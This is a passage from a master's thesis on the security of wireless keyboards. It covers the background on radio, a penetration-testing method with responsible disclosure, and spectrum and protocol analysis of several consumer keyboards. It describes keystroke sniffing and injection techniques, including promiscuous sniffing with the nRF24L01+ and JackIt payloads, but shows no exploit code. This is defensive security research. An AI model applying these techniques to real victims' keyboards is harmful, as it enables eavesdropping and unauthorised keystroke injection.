A.6 Code to JackIt to enable automatic payload creation for the
Exibel protocol . . . . . . . . . . . . . . . . . . . . . . . . . 138
A.7 Corsair lookup table. . . . . . . . . . . . . . . . . . . . . . . 140
xx | Listings
List of acronyms and abbreviations | xxi
List of acronyms and abbreviations
AES Advanced Encryption Standard
CRC cyclic redundancy check
CVE Common Vulnerabilities and Exposures
EEPROM electrically erasable programmable read-only memory
FSK frequency shift keying
GSM Global System for Mobile communications
Io T Internet of Things
ISM industrial, scientific and medical
SDR software defined radio
USB Universal Serial Bus
xxii | List of acronyms and abbreviations
Introduction | 1
Chapter 1
Introduction
This chapter introduces the reader to the problem area in Section 1.1 and
then specifies the specific problem that the thesis addresses in Section 1.2 .
Section 1.3 describes the purpose of this research and Section 1.4 gives the
project’s goals. Section 1.5 describes the research methodology selected for
carrying out this research while Section 1.6 delimits the scope of the project.
Finally, Section 1.7 describes the structure of the remainder of this thesis.
1.1 Background
Wireless keyboards are in use everywhere and are often used in an attempt to
reduce cable clutter or in situations where the distance between computer and
keyboard is further than the length of a regular cable. However, these devices
are not purchased because of their security advantages, and often the security
aspect is not something the end user is even aware of.
The problem of insecure wireless keyboards has been known since all the
way back in 2010 when Schroeder and Moser demonstrated KeyKeriki which
is a physical device they built to be able to listen to keystrokes and remotely
inject keypresses on keyboards [ 1]. Their work was further developed in 2015
by Samy Kamkar when he developed KeySweeper, a camouflaged wall charger
that listened to keystrokes and reported them back over Global System for
Mobile communications (GSM) to whoever installed the device [ 2].
This thesis aims to demonstrate the steps necessary to identify and debug
security issues of using wireless keyboards from a black box perspective
(i.e., no information on the internal workings of the keyboards will be
known beforehand). T o do this 10 different keyboards were randomly chosen
from three different common consumer electronic stores in Sweden. These
2 | Introduction
keyboards all use a Universal Serial Bus (USB) dongle to communicate with
the computer. Some of these keyboards also support Bluetooth without
requiring a dongle ( i.e., assuming that the computer already has a Bluetooth
interface).
1.2 Problem
The problem that this thesis seeks to answer is: What security issues exist in
typical wireless keyboards?
T o answer this we will evaluate each keyboard using two further questions:
1. Is it possible to listen in on what is being typed?
2. Is it possible to send keystrokes without physical access to the keyboard?
1.3 Purpose
Given that the analyzed keyboards have a poor security implementation and
any flaws are found, the manufacturers will become aware of the security
issues in their products and then be given an opportunity to mitigate these
issues. They can then eliminate the threat of malicious actors abusing these
security flaws [ 3, §2.1 Reduce Harm]. With light shone on the problems
manufacturers will hopefully take greater consideration of security when
designing new products and the industry as a whole can become more secure.
Manufacturing products with known flaws could be deemed unethical and
this thesis will hopefully help push the industry in the right direction [ 3, §2.5
Ethical Considerations].
Identifying the potential vulnerabilities will hopefully make consumers
more aware of what products they buy, which in turn can promote the
manufacturing of secure products as these will be in greater demand by
consumers. The end goal is for every product to be as secure as it can be,
as this is beneficial for society as a whole.
For security students and professionals, the purpose of this thesis is to
illuminate potential flaws so they can advise their peers and clients of what to
look out for in these types of products and what to avoid in any context where
security is a concern.
The project is ethical since the purpose is to improve security and the
hacking is not done for any malicious gains and is done with responsibility
in mind.
Introduction | 3
1.4 Goals
The goal of this project is to identify a vulnerability in at least one of the
keyboards to indicate that there are security concerns related to wireless
equipment as well as to show that a new scientific discovery has been made.
This has been divided into the following three sub-goals:
SG 1 T o satisfy the security industry at least one keyboard with a vulnerability
should be found and the manufacturer should be notified.
SG 2 T o satisfy the scientific expectations at least one new scientific insight
related to wireless keyboards should be made. This could be a
previously unknown vulnerability in a wireless keyboard being found
and mapped out.
SG 3 T o satisfy the academic goals of the course suﬀicient conclusions should
be able to be drawn from the findings related to the previous sub-goals
in such a way that future work can build upon this thesis.
1.5 Research Methodology
The main goal of the thesis is to show vulnerabilities in the analyzed
keyboards. The methodology is penetration testing focused and based on work
by Georgia Weidman [ 4] showing the seven stages of a penetration test and
what each stage entails. Her work was primarily focused on software, but can
be adapted to work with the analysis of hardware products. Penetration testing
is a commonly used way of assessing security in systems and Weidman’s
methodology has been successfully used in the analysis of Internet of Things
(Io T) devices in reports such as Madeleine Berner’s Master’s thesis [ 5].
1.6 Delimitations
The scope of this thesis is chosen to emulate what a malicious actor could
achieve from a distance and will focus on things that are common between the
keyboards. The thesis will not delve too deeply into questions that themselves
warrant a thesis on their own. Therefore, the concrete delimitations of what
will not be covered are:
•Bluetooth communication. (Only wireless communication to/from the
radio dongle will be analyzed);
4 | Introduction
•Keyboard-specific hardware analysis, such as extracting secrets from
the keyboard’s electrically erasable programmable read-only memory
(EEPROM); and
•Decryption of data encrypted with strong algorithms, such as Advanced
Encryption Standard (AES) in any novel ways.
1.7 Structure of the thesis
Chapter 2presents relevant background information about Wireless commu-
nication and the related work that has been conducted in the area. Chapter 3
presents the methodology and method used to solve the problem in the form
of penetration testing. Chapter 4describes each step in the actual penetration
step, in suﬀicient detail so that the process can be repeated while Chapter 5
summarizes the results of the penetration test. The discussion of the results,
methodology, and limitations of the project are found in Chapter 6and finally,
Chapter 7describes the thesis conclusion and what can be expanded upon in
future work.
Background | 5
Chapter 2
Background
This chapter provides basic background information about previous research
conducted within the area of wireless keyboards. Section 2.1 describes the
basics of the wireless communication that the keyboards use. Section 2.3
describes related work that the research in this thesis is based upon. Section 2.5
describes related work that has been used for inspiration and to understand the
feasibility of advanced research in the related area.
2.1 Wireless communication
As this thesis is focused on wireless keyboards, this section provides some
basics about the specific sorts of issues of wireless communication that a
reader will want to know about to understand the rest of this thesis.
2.1.1 2.4 GHz ISM Band
Wireless communications are strictly regulated internationally but certain
bands are assigned to usage by unlicensed users. Examples of these
include the industrial, scientific and medical (ISM) bands. One of ISM
bands is the 2.4GHz to 2.5GHz band which is defined by the International
T elecommunication Union Radio Regulations as an ISM band [ 6]. This band
is widely used by technologies such as Bluetooth and Wi-Fi∗as well as in
common consumer electronics including wireless keyboards. These uses are
by devices that are so-called tertiary users of the band. This means that the
primary and secondary users of the band that experience interference from
∗Wi-Fi is an industrial brand name for devices that follow the IEEE 802.11 family of
standards.
6 | Background
these tertiary users can require that the tertiary users shut off their devices.
For this reason, most of these tertiary users obey both a network etiquette (of
listening before transmitting), must use lower power transmitters, and in the
case of the U.S. Part 15J regulations must use spread spectrum coding (either
direct sequence or fast frequency hopping) [ 7].
2.1.2 Frequency-shift keying
Analog radio frequencies can be used to transmit digital data by means
of various methods of modulation, such as frequency shift keying (FSK).
According to Encyclopaedia Britannica, FSK works by varying the frequency
of the transmitted signal in discrete predetermined amounts such that a digital
symbol can be specified by the different frequencies∗. The usage of two
distinct discrete frequencies makes it possible to transmit either a zero or a
one and therefore binary data can be carried across an analog channel [ 8].
2.1.3 Bitrate
Bitrate is the definition of how much data (how many bits) can be sent in
some amount of time, typically 1s. The digital data transmitted by a radio
transceiver will have some limitations on how often a new symbol can be sent
which will affect the rate at which data can be sent. A transmitter and a receiver
have to use the same symbol rate and be synchronized to be able to convey the
correct data. For example, with an encoding of one bit per symbol and FSK
encoding, the message 0101 can be interpreted as 00110011 if the receiver
samples the data twice as fast as the transmitter is sending.
2.1.4 Line code
Transmitted data can be encoded in different ways to facilitate error correction
and check the validity of the data when received. The simplest line code is
a non-return to zero in which a high signal indicates a 1 and a low signal
indicates a 0. There is also return to zero, in which a 1 is indicated by a
transition from low, to high, and back to low . And a 0 is indicated by just
staying at low . In other words, the signal will always return to low (zero)
after each sent signal. Other line codes such as Manchester encoding†use the
∗https://www.britannica.com/technology/
digital-signal-modulation
†https://www.geeksforgeeks.org/manchester-encoding-in-computer-network/
Background | 7
transition from low to high and vice versa to convey a change in the data and
also make use of a clock to ensure validity .
Figure 2.1: Display of different line codes. At the top is the clock for the signal
followed by non-return to zero, return to zero, and Manchester encoding.
2.1.5 Protocols
T o structure the data transmitted between devices some sort of common
protocol has to be used. Most often the protocol stack defines a logical link
frame consisting of a preamble (usually this is a series of alternating bits, to
allow the receiver to synchronize its clock to that of the transmitter, and a start
of frame flag), a destination address, and some data (see Figure 2.2 ). Some
protocols make use of other fields in the link frame, such as source address,
frame type, length, flag bits, checksum, and more. The exact specifications
of the protocol vary widely between manufacturers and devices. Attempts to
automatically extract the protocol have been made and implemented in various
software, such as that described by Pohl and Noack [ 9].
8 | Background
0 1 2 3 4 5 6 7 8 910 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
Preamble
Address
Data Checksum
Figure 2.2: Example of how a protocol for a wireless device can look
2.1.6 Checksums
Checksums are often used to ensure the validity of received data. For digital
data, this is often implemented with a cyclic redundancy check (CRC). If a
CRC is sent along with the rest of the data the CRC can be calculated by the
receiver to validate the integrity of the received data [ 10]. If the data were to
be corrupted in transmission then the calculated CRC and the sent CRC would
not match and therefore the receiver can disregard the sent data or actively
send a request for a retransmission of the frame.
2.1.7 Software defined radio
Software defined radios (SDRs) are versatile devices where many components
of the radio are substituted with software variations of them. This makes it
possible to flexibly control the radio through software and adapt it to many
different applications and scenarios [ 11]. The versatility of a SDR makes it
useful in debugging and for research where the system under investigation is
not completely known.
2.2 CVE
The origin of Common Vulnerabilities and Exposures (CVE) is described in
[12]. CVE®and the CVE logo are registered trademarks of The MITRE
Corporation. The CVE mission is to identify, define, and catalog publicly
disclosed cybersecurity vulnerabilities, it is run by the MITRE Corporation
and sponsored by departments and agencies of the United States [ 13].
Background | 9
2.3 Previous Research
As this is not the first time wireless keyboards have been scrutinized there is
some related work that is relevant which will be covered in this section. The
specific keyboards however are unique to this thesis with the exception of the
Logitech MK270. The related work inspired the hardware used in the project
as it had proven successful previously .
2.3.1 Promiscious mode nRF24L01+
The Nordic Semiconductor nRF24L01+∗is a popular 2.4GHz transceiver that
is intended to communicate with a device with a known address. Travis
Goodspeed discovered the ability to promiscuously sniff radio traﬀic with
it by telling it to ignore checksums and use a 2 byte receiver address (the
documented minimum address length is 3 bytes) and specifying the address
as 0x0055 (binary 0000 0000 0101 0101) in an attempt for the radio to think
that the preamble of some radio transmission is the address it is sending to [ 14].
It is then possible to sniff arbitrary communication since the radio is tricked
into thinking the preamble signals are addresses intended for the transceiver.
2.3.2 Bastille Research
Previous work has been done in regards to compromising wireless keyboards.
Bastille Research has shown various vulnerabilities in keyboards and mice of
various manufacturers. They have developed firmware for the nRF24LU1+ to
aid in 2.4GHz wireless research [ 15]. The discovered vulnerabilities include
weaknesses in products from Logitech, Microsoft, Dell, and more. These
vulnerabilities made it possible to both inject and sniff keystrokes. The
vulnerabilities discovered by Bastille indicate that the research question of
this thesis is feasible to answer and it also shows that manufacturers should
be aware of these types of security issues when designing products [ 16].
2.3.3 JackIt
Extensive work has been done with the research firmware published by
Bastille [ 15] to aid in exploit development when using the nRF24LU1+. JackIt
is an extension of the RFStorm nRF24LU1+ Research Firmware suite which
adds the ability to sniff the surroundings for pre-programmed signatures and
∗https://www.nordicsemi.com/Products/nRF24-series
10 | Background
automatically launch attacks against vulnerable devices∗. The code adds
support for Ducky script†which makes it easy to use and to adapt when new
payloads are needed.
2.4 Summary
Wireless devices often communicate over an ISM band such as the 2.4GHz
band and wireless keyboards are no exception to this. T o enable digital data to
be transmitted over analog radio some type of modulation is often used such
as FSK. On top of this different settings such as line coding, bitrate, and what
protocol to use can differ wildly . Checksums are also sometimes used to ensure
the data validity of transmissions. Previous work on wireless keyboards has
been done and has proven that security in wireless keyboards can be lacking
but more work is needed.
2.5 Related Work
In addition to the prior work described above, there are also some additional
related work - as described in the following subsections.
2.5.1 NA TO Tempest
T empest is a NATO certification covering leaking emanations such as
electromagnetic radiation. It is used to classify equipment based on how close
in proximity an attacker can get without being able to intercept leaking signals.
The shielding standards for equipment go from Level A to Level C, with Level
A being the strictest and assumes that an attacker has almost immediate access
(∼1m) [ 17].
2.5.2 Air-gap
An air-gapped computer och network is one that is not connected to the internet
in any way, indirect or not. There has been plentiful research conducted on the
exfiltration of data from air-gapped computers and it has proven possible to
extract data from a distance from Ethernet cables, Serial AT Attachment ( i.e.,
∗https://github.com/insecurityofthings/jackit
†https://docs.hak5.org/usb-rubber-ducky-1/
the-ducky-script-language/ducky-script-quick-reference
Background | 11
SATA) cables, screen brightness, central processing unit-generated magnetic
fields, and many more ways.
2.5.3 Far Field Electromagnetic Side-Channel Attack
Previous somewhat related work on electromagnetic emissions as a side-
channel has proven it possible to attack AES-128 from up to 15 meters
away [ 18]. This was made possible with the aid of a deep neural network,
and a convolutional neural network with the input size of 110 seemed to give
the best results in a majority of the experiments. Recovering the AES key
from up to 15 meters away by listening to an electromagnetic side-channel
was possible and it shows what kind of information can be gathered from a
distance from unaware victims.
12 | Background
Method | 13
Chapter 3
Method
Previous research by Berner [ 5] indicated a successful usage of the penetration
testing framework by Weidman [ 4]. This same testing framework will be used
as a guide in this thesis as well. Section 3.1 gives an overview of the research
process and the necessary steps in a penetration test according to Weidman [ 4].
Section 3.2 describes the research paradigm, and Section 3.3 describes all the
actual steps carried out in the research. Section 3.4 describes the hardware and
software used to perform the research and Section 3.5 describes the validity
and reliability of the chosen method.
3.1 Research Process
T o conduct a penetration test there are seven steps to follow . Pre-engagement,
Information Gathering, Threat Modeling, Vulnerability Analysis, Exploita-
tion, Post Exploitation, and Reporting.
3.2 Research Paradigm
The thesis uses the positivistic paradigm with a qualitative case study for
each analyzed keyboard. A deductive approach is used to answer the research
questions(s) and an inductive approach is used to gather information about the
radio transmissions and protocols of the keyboards.
14 | Method
3.3 Penetration test
This section will describe the seven steps of penetration testing in more detail.
The seven steps will each be covered in the seven subsections and details on
how the steps relate to this specific penetration test will be explained as well.
3.3.1 Pre-engagement
This step consists of communicating with the client about the scope, terms,
contact information, approvals need, and agreements needed.
Since this penetration test is performed as a research project and not as a
part of a service purchased by a client there are some details of this that have to
be adapted to this situation. As such most of the details here will be provided
by the researcher and not by any client; hence, details that are not provided by
the researcher are omitted.
3.3.2 Information Gathering
The next step is information gathering which usually consists of port scanning,
often with common tools such as Nmap [ 19], and gathering open source
intelligence. This is the initial step of the actual penetration test and
the first part of the information gathering required to reverse engineer the
radio transmissions of the keyboard to be able to understand how this
communications link works.
For this specific penetration test, this step will include gathering
information about the keyboards based upon their product specification as well
as through spectrum analysis and frequency scanning. By mapping out what
frequencies the keyboard uses, one can listen in more detail to those specific
frequencies to record the actual transmissions from the keyboard.
3.3.3 Threat Modeling
Threat modeling uses the information gathered in the previous step to create
a plan on how to attack the targeted system. Strategies are developed based
on the information that has been gathered and different ways of attacking and
then an action plan is constructed.
Since the approach of this thesis is already established and the attack
vectors are already chosen, this step can be mostly disregarded for this
specific penetration test. The threat model will be nearly the same for all
Method | 15
the investigated keyboards and will look at the wireless communication that
occurs between the targeted keyboard and the corresponding dongle that is
connected to some target computer. The only possible difference will be the
different frequencies in the 2.4GHz ISM band, that each type of keyboard
operates in. The research will be conducted with a black box perspective since
the intent is to be able to perform the attacks without physical access to the
devices, however, the keyboard will be interacted with to mimic a victim and
to be able to perform plain text analysis with known inputs.
3.3.4 Vulnerability Analysis
The developed threat model is used in this step to discover any vulnerabilities.
Often a list of common vulnerabilities is used such as the OW ASP top 10 to
start with [ 20]; however, since those vulnerabilities target web applications
they will not be applicable. Automated tools are often used to scan for
vulnerabilities but a large part of this penetration testing is a manual analysis
and critical thinking to find as many of the vulnerabilities as possible.
In this thesis, the manual analysis consists of reverse engineering the
transmissions that the keyboard sends. By analyzing the protocol and figuring
out how it works, the goal of this stage is to figure out the protocol and
information contained in the individual link frames and how these frames are
structured.
3.3.5 Exploitation
The actual exploitation of the vulnerabilities is conducted in this step. The
exploitation of the identified vulnerabilities means actually performing an
attack against the system. If there exists vulnerabilities and the analysis was
done correctly, then this is when you may gain access to the attacked system.
The exploitation of the vulnerable keyboards means trying to listen in
on what is being typed or trying to send manually crafted packets as if they
were typed on the keyboard. If successful, then the penetration test will be
deemed successful. However, the following steps are crucial to ensure that the
vulnerabilities can be addressed by the vendor.
16 | Method
3.3.6 Post Exploitation
Post exploitation is where the actual impact of the exploit is determined. If the
exploit resulted in access to an unused system the vulnerabilities’ severity can
be deemed lower than if the information that can be gathered is critical to the
operations of the client.
For the wireless keyboards, this means that keystroke injection can be
deemed more severe than keystroke sniﬀing since injection means that it
is possible to get full access to the system and potentially install malicious
software for persistence to be able to stay on the targeted host even when the
keyboard is unplugged.
3.3.7 Reporting
The final phase is reporting the findings of the penetration test. This step is
crucial since this is where the client is given the ability to fix the vulnerabilities
that have been found. In this step, it is important to convey the findings to the
client in such a way that the severity of the vulnerability is understood and
dealt with appropriately .
This step will be performed by notifying the manufacturers of the different
keyboards when vulnerabilities are found. The Internet Engineering T ask
Force guidelines for Responsible Vulnerability Disclosure Process’ [ 21]∗will
be used to report the vulnerabilities in a responsible and ethical way to make
sure that the vulnerabilities do not appear in the wild before the manufacturers
are given the chance to remedy them. Since the vulnerabilities will be publicly
available once the thesis is published, CVE IDs will be requested to catalog
and aid in coordination with manufacturers†. Only a handful of people will
have been aware of the potential vulnerabilities before the publication of this
thesis, including my supervisors, examiner, peer reviewers, CERT -SE‡, and
the affected vendors.
∗Note that this Internet Draft expired in August 2002.
†For information about CVE see Section 2.2 on page 8.
‡https://www.cert.se/
Method | 17
3.4 Hardware and Software to be used
Section 3.4.1 describes the hardware that will be used while Section 3.4.2
describes the hardware that will be used for all of the experiments and analysis
of the results of the experiments.
3.4.1 Hardware
The hardware used to conduct the research is a SDR called the HackRF One∗.
The HackRF One can take as input RF signals in the range of 1MHz to 6GHz
and can sample at up to 20 million samples per second with 8-bit quadrature
samples ( i.e., 8-bit I and 8-bit Q). It is connected to a computer via Hi-Speed
USB 2.0. This SDR is used to gather initial information about the targeted
system.
A Crazyradio P A†is a radio with the nRF24LU1+ chip ( i.e., it is a 2.4GHz)
ISM band transceiver) and it has a USB-A connection. This product was also
used in [ 16] and in subsequent research. It was used to both capture and send
data after initial analysis with the HackRF One had been completed.
Furthermore, the actual wireless keyboards are required (see T able 3.1 ).
Details of each of these wireless keyboards will be given in Chapter 4.
T able 3.1: Wireless keyboards used for the experiments
V endor Model
Plexgear Mediatrack Edge X
Plexgear KM-Silent
Deltaco TB-122
Clas Ohlson 38-6600
Rapoo E9100M
Logitech MK270
Corsair K63 Wireless
iiglo MK610
Exibel 38-8940
Razer BlackWidow V3 Pro
∗https://greatscottgadgets.com/hackrf/one/
†https://www.bitcraze.io/products/crazyradio-pa/
18 | Method
3.4.2 Software
The software used for the analysis of the radio frequency spectrum is
Qspectrumanalyzer∗which makes it possible to visualize the spectrum being
sampled by the HackRF One. Analysis of the individual frames sent by each
of the keyboards was done with Universal Radio Hacker [ 22,23]†which can
demodulate and display the signals visually in an intuitive way as well as aid
in protocol analysis. Additionally, exploit payloads utilized the JackIt code‡.
All of these programs are written in Python and Python 3.10 was used to run
them.
T o aid in reverse engineering checksum algorithms the program CRC
RevEng§was used. It is a tool that can automatically calculate the CRC
parameters used given that it is given enough samples to cross reference and
there exists parameters that reflect the given input.
The software used for the Crazyradio P A is the RFStorm nRF24LU1+
Research Firmware [ 15]. The firmware was adapted for this project and
additions to the firmware were written in C and compiled with SDCC¶. The
additional code can be found in appendix A
3.5 Validity and Reliability of method
The method used has previously been used and is considered reliable when
used for this type of research. The results are reproducible using the method
described and can be considered reliable. The major drawback of the method
is the large usage of manual vulnerability analysis which can require prior
knowledge since intuition can play a role in how vulnerabilities are discovered.
The method is deemed valid in answering the research question since it has
proven fruitful in the past and penetration testing is an industry-standard when
assessing security flaws.
∗https://github.com/xmikos/qspectrumanalyzer
†https://github.com/jopohl/urh
‡https://github.com/insecurityofthings/jackit
§https://reveng.sourceforge.io/
¶http://sdcc.sourceforge.net/
Penetration test | 19
Chapter 4
Penetration test
The laboratory environment used to conduct the penetration test is shown
in Figure 4.1 . The setup makes use of two different computers: one victim and
one attacker. The attacker listens to signals transmitted from the keyboard and
if applicable sends signals to the USB dongle. As described previously, the
information gathering in the first stage of vulnerability analysis was conducted
with the HackRF One and in the second stage of vulnerability analysis and
exploitation with the Crazyradio P A (see Section 3.4.1 for a description of
both devices). This chapter is divided into two parts: Section 4.1 contains
everything up to and including the first stage of the vulnerability analysis and
coveres the different keyboards. Section 4.2 contains the rest of the steps in the
penetration test and focuses on the different protocols used by the keyboards.
Figure 4.1: Lab setup describing the victim and attacker
20 | Penetration test
4.1 Keyboard specific pre-engagement,
Information gathering, and
vulnerability analysis
This section addresses the first steps of the penetration test up to and including
vulnerability analysis for each of the different keyboards. Each keyboard is
addressed in a different subsection with a summary in Section 4.1.11
4.1.1 Plexgear Mediatrack Edge X
This section describes the Plexgear Mediatrack Edge X and all the steps that
were conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.1.1 covers pre-engagement and information
gathering, and Section 4.1.1.2 covers vulnerability analysis of the keyboard.
4.1.1.1 Pre-engagement and Information gathering
Plexgear Mediatrack Edge X∗is a basic wireless keyboard from Kjell & Co
Elektronik AB. The keyboard features a touchpad and has a built-in battery .
The manual states that it communicates over the 2.4GHz band but no further
information is given. The manual also promises a maximum communication
range of up to 8m and states that the device is supported in Windows from
Vista and onward. Figure 4.2 shows an image of this keyboard and its box.
∗https://www.kjell.com/globalassets/mediaassets/773697_
94913_manual_en_no_se.pdf?ref=6C4BDA9164
Penetration test | 21
Figure 4.2: Plexgear Mediatrack Edge X keyboard and box
The first step in information gathering was to scan the 2.4GHz to 2.5GHz
spectrum to find what frequencies the keyboard used. While buttons on the
keyboard were pressed, Qspectrumanalyzer was used to collect data about the
frequencies used. The resulting spectrum is shown in Figure 4.3 . Figure 4.3
shows distinct peaks at 2422 MHz, 2442 MHz, and 2454 MHz and with spikes
on either side of the center frequency which indicates FSK as the likely
modulation.
22 | Penetration test
Figure 4.3: Plexgear Mediatrack Edge X spectrum analysis. The upper part of
the figure shows a spectral plot from 2.4GHz to 2.5GHz
4.1.1.2 Vulnerability Analysis
Key presses were recorded with Universal Radio Hacker [ 22] using the
HackRF One when the keys “ A ”,“S”, and “D” were pressed in rapid succession
on the keyboard. The keys were chosen because “ A ” is the first letter of the
alphabet and the other letters were the sequentially following letters on the
same row of the keyboard. Three different keys were used so that there was
some variety in the transmitted data and more than three keys were not deemed
necessary to extrapolate suﬀicient information from the transmissions. The
recording was done at 2422 MHz with a sample rate of 10 million samples
per second to ensure no details were lost in the recording. The data sheet for
the Nordic Semiconductor nRF24LU1+ states a bandwidth for the transceiver
of less than 2MHz [ 24]. An assumption was made that the bandwidth of the
keyboard was less than this bandwidth, but that this was wide enough to avoid
loss of any sideband values. These settings are shown in the upper left-hand
corner of Figure 4.4 .
Penetration test | 23
Figure 4.4: Recording when one of the keys was pressed on the Plexgear
Mediatrack Edge X
The recording was saved and the full set of analog data from three key
presses are shown in Figure 4.5 .
Figure 4.5: Analog view of the data from the Plexgear Mediatrack Edge X
when three keys were pressed
24 | Penetration test
A single transmission due to a single key press was zoomed in on and the
analog view of this can be seen in Figure 4.6 .
Figure 4.6: Analog view of a single key press from the Plexgear Mediatrack
Edge X
Using information gathered previously in Figure 4.3 the modulation
type was selected in Universal Radio Hacker as FSK and using the handy
demodulated signal view a demodulated version of the signal is shown
in Figure 4.7 . The demodulated view displays a clear FSK signal which
indicates FSK was in fact the modulation technique that was being used. T o
automatically extract the actual bits from the transmission the bitrate had to be
calculated to ensure that the correct data was extracted.
Figure 4.7: Demodulated view of a single key press from the Plexgear
Mediatrack Edge X
Penetration test | 25
The bitrate was determined by selecting the smallest amount of data used to
carry a single bit (assuming that each symbol carried a single bit). A selection
of 10 samples was required to transmit a single high value (1 bit) and from
this, the bitrate was calculated by substituting the number of samples for a bit
into the recorded sample rate.
Recorded sample rate: 10 000 000 samples/s
10 samples = 1 bit
1 000 000 bits/s= 1 Mbit s−1
Figure 4.8: Bitrate calculation from the Plexgear Mediatrack Edge X
The signal was then sent to the analysis tool of Universal Radio Hacker for
protocol analysis. The results are shown in Figure 4.9 and a zoomed view in
Figure 4.10 .
The protocol was reverse engineered and information including the
preamble, address, sequence number, and data was observed. The information
about this protocol can be found in Section 4.2.1 and will from now on be
referred to as the Plexgear Protocol.
26 | Penetration test
Figure 4.9: Protocol from the Plexgear Mediatrack Edge X. Each row
represents an individual captured transmission and each column is half a byte
(4 bits) of data. The coloring has been performed manually to assist the reverse
engineering process slightly by separating what appears to be different parts
of the protocol.
Penetration test | 27
Figure 4.10: Protocol from the Plexgear Mediatrack Edge X - a zoomed
version of Figure 4.9
28 | Penetration test
4.1.2 Plexgear KM-Silent
This section describes the Plexgear KM-Silent and all the steps that were
conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.2.1 covers pre-engagement and information
gathering, and Section 4.1.2.2 covers vulnerability analysis of the keyboard.
4.1.2.1 Pre-engagement & Information gathering
Plexgear KM-Silent∗is a slightly more expensive keyboard compared to the
Plexgear Mediatrack Edge X. This keyboard is also from Kjell & Co Elektronik
AB. The keyboard comes with a mouse and requires 2 AAA batteries to
operate. The manual states that it communicates in the 2.4GHz band but no
further information is given. The manual promises a range of up to 10 m and
it states that the keyboard is supported from Windows XP to Windows 10 as
well as being supported by Mac OS.
Figure 4.11: Plexgear KM Silent keyboard and box
∗https://www.kjell.com/globalassets/mediaassets/767689_
61855_manual_en_no_sv.pdf?ref=1CD8D4FF33
Penetration test | 29
The same steps as for the precious keyboard were performed. The 2.4GHz
to2.5GHz spectrum was analyzed to figure out what frequencies the keyboard
used. The same buttons on the keyboard were pressed and Qspectrumanalyzer
was used once again to collect data. The resulting spectrum is shown
in Figure 4.12 . Figure 4.12 shows distinct peaks at 2430 MHz, 2450 MHz,
2462 MHz, and 2482 MHz and once again spikes on either side of the center
frequency which indicates FSK as the likely modulation.
Figure 4.12: Plexgear KM Silent spectrum analysis
4.1.2.2 Vulnerability Analysis
The same settings as previously were used to record the key presses from
the Plexgear KM Silent, except the selected frequency which was changed to
2430 MHz, and the exact same keys were pressed once again. These settings
are shown in the upper left-hand corner of Figure 4.13 .
30 | Penetration test
Figure 4.13: Recording key presses on the Plexgear KM Silent
The recording was saved and the full set of analog data from three key
presses are shown in Figure 4.14 .
Figure 4.14: Analog view of the data from the Plexgear KM Silent
Penetration test | 31
A single transmission due to a single key press was zoomed in on and the
analog view of this can be seen in Figure 4.15 .
Figure 4.15: Analog view of a single key press from the Plexgear KM Silent
Using information gathered previously in Figure 4.12 the modulation type
was selected in Universal Radio Hacker as FSK and a demodulated version
of the signal is shown in Figure 4.16 . The signal had a small amount
of noise but the intended levels were still distinguishable from the errors.
The demodulation was once again determined to correctly be FSK and to
automatically extract the actual bits from the transmission the bitrate had to
be calculated again.
Figure 4.16: Demodulated view of a single key press from the Plexgear KM
Silent
32 | Penetration test
The bitrate was determined by selecting the smallest amount of data used to
carry a single bit (assuming that each symbol carried a single bit). A selection
of 10 samples was required to transmit a single high value (1 bit) and from
this, the bitrate was calculated by substituting the number of samples for a bit
into the recorded sample rate.
Recorded sample rate: 10 000 000 samples/s
10 samples = 1 bit
1 000 000 bits/s= 1 Mbit s−1
Bitrate: 1Mbit s−1
Figure 4.17: Bitrate calculation from the Plexgear KM Silent
The signal was then sent to the analysis tool of Universal Radio Hacker for
protocol analysis. The results are shown in Figure 4.18 and a zoomed view
in Figure 4.19 . Striking similarities between the Plexgear keyboards can be
observed in the protocol figures.
The protocol was reverse engineered and information including the
preamble, address, sequence number, and data was observed. The information
about this protocol can be found in Section 4.2.1 .
Penetration test | 33
Figure 4.18: Protocol from the Plexgear KM Silent
34 | Penetration test
Figure 4.19: Protocol from the Plexgear KM Silent - a zoomed version of
Figure 4.18
Penetration test | 35
4.1.3 Deltaco TB-122
This section describes the Deltaco TB-122 and all the steps that were
conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.3.1 covers pre-engagement and information
gathering, and Section 4.1.3.2 covers vulnerability analysis of the keyboard.
4.1.3.1 Pre-engagement & Information gathering
Deltaco TB-122∗is a keyboard in the lowest price range. The keyboard
features Fn keys but has no other special features and does not come with
a mouse or touchpad. The keyboard requires 2 AAA batteries to operate.
The manual states that it communicates in the 2.4GHz band but no further
information is given. The manual promises a range of up to 10 m.
Figure 4.20: Deltaco TB-122 keyboard and box
∗https://www.deltaco.se/sites/cdn/InformationDocumentsLibrary/
TB-122.pdf
36 | Penetration test
Figure 4.21: Deltaco TB-122 spectrum analysis
4.1.3.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and the only
changed variable was the recording frequency . All other details were the same
and the details of the protocol can be found in Section 4.2.1 .
Penetration test | 37
Figure 4.22: Recording key presses on the Deltaco TB-122
Figure 4.23: Analog view of the data from the Deltaco TB-122
38 | Penetration test
Figure 4.24: Analog view of a single key press from the Deltaco TB-122
Figure 4.25: Demodulated view of a single key press from the Deltaco TB-122
Figure 4.26: Bitrate calculation from the Deltaco TB-122
Penetration test | 39
Figure 4.27: Protocol from the Deltaco TB-122
40 | Penetration test
Figure 4.28: Protocol from the Deltaco TB-122 - a zoomed version of
Figure 4.27
Penetration test | 41
4.1.4 Clas Ohlson 38-6600
This section describes the Clas Ohlson 38-6600 and all the steps that were
conducted to gather as much information as possible about the keyboard
and how it operates. Section 4.1.4.1 covers pre-engagement and information
gathering, and Section 4.1.4.2 covers vulnerability analysis of the keyboard.
4.1.4.1 Pre-engagement & Information gathering
Clas Ohlson 38-6600∗is a keyboard in the lowest price range. The keyboard
comes with a mouse and requires 1 AA battery to operate. There is no
information about the range, frequencies, or supported operating systems.
Figure 4.29: Clas Ohlson 38-6600 keyboard and box
∗https://www.clasohlson.com/medias/sys_master/h1d/h5d/
17566941216798.pdf
42 | Penetration test
Figure 4.30: Clas Ohlson 38-6600 spectrum analysis
4.1.4.2 Vulnerability Analysis
The same steps as for the previous keyboards were performed and the only
changed variable was the recording frequency . All other details were the
same as the previous keyboards and the details of the protocol can be found in
Section 4.2.1 .
Penetration test | 43
Figure 4.31: Recording key presses on the Clas Ohlson 38-6600
Figure 4.32: Analog view of the data from the Clas Ohlson 38-6600
